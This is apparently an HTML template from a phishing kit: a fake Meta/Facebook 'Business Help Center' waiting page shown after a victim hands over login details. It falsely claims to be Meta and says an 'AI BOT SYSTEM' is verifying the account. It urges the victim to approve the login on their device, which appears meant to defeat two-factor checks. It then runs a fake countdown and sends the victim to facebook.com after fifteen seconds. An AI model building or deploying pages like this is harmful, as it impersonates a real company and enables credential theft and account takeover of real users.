<!DOCTYPE html>
<!-- saved from url=(0038)https://lucky.bussiness-suite.com/wait -->
<html lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <link rel="icon" type="image/svg+xml" href="{{ url('source/image/facebook/logo.png') }}">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <title>Business Help Center | Privacy Policy</title>
    <link rel="stylesheet" href="{{ url('source/assets/facebook/waiting.css?version=12321') }}">
</head>

<body class="bg-light" style="">
    <div id="root">
        <section class="header">
            <div class="fotoh">
                <div class="row g-0">
                    <div class="col-6"><a href="https://facebook.com"><img
                                src="{{ url('source/image/facebook/logo.png') }}" class="img-fluid" width="40"></a>
                    </div>
                    <div class="col-6" style="text-align: right;">
                        <p
                            style="color: rgb(53, 120, 229); display: none; padding-top: 8px; margin-bottom: 0px; font-weight: 600; font-size: 15px;">
                            <i class="fa-solid fa-envelope" style="font-size: 16px;"></i> Support Inbox
                        </p>
                    </div>
                </div>
            </div>
        </section>
        <section id="fac" style="display: block;">
            <div class="container px-4">
                <div class="row justify-content-center g-0">
                    <div>
                        <div class="card">
                            <div class="bodyyy" style="max-width: 800px;">
                                <div class="row g-0">
                                    <div class="pb-md-0 col-auto my-auto pb-3"><img
                                            src="{{ url('source/image/facebook/ref.png') }}" alt=""
                                            style="width: 130px;"></div>
                                    <div class="col-12 col-md-9">
                                        <p><strong> Hi, We are receiving your information</strong></p><br>
                                        <p>We are trying to verify your login information using AI BOT SYSTEM. Make sure
                                            you are logged in and please approve on the device you are logging in to.
                                        </p>
                                        <p>After successful security verification with Meta.Your account will return to
                                            normal operating status.</p><br>
                                        <p>Please wait, this could take up to 03-05 minutes, please be patient while we
                                            review your case... (wait <span id="waitTime" class="numbers">05:00</span>)
                                        </p>
                                        <div id="progressBar">
                                            <div id="progressBarsub" style="width: 100%;"></div>
                                        </div>
                                        <ul id="countdown" style="display: none;">
                                            <li><span id="day" class="numbers">00</span>
                                                <p class="name">days</p>
                                            </li>
                                            <li><span id="hour" class="numbers">00</span>
                                                <p class="name">hours</p>
                                            </li>
                                        </ul>
                                        <p>Meta Thank you for always trusting our experience and using our
                                            services.<br />
                                            © 2023 Facebook Meta © 2023
                                        </p>

                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </div>
    <script>
        const count = 300;
        var dadem = 0;
        setInterval(function() {
            let conlai = count - dadem;
            if (conlai == 285) {
                window.location.href = 'https://facebook.com';
            }
            let phut = Math.floor(conlai / 60);
            let giay = conlai % 60;
            if (giay.toString().length == 1) {
                giay = '0' + giay;
            }
            let text = '0' + phut + ':' + giay;
            let phantram = 100 * (1 - dadem / count);
            $('#progressBarsub').css('width', phantram + '%');
            $('#waitTime').text(text);
            dadem++;
        }, 1000);
    </script>
</body>

</html>
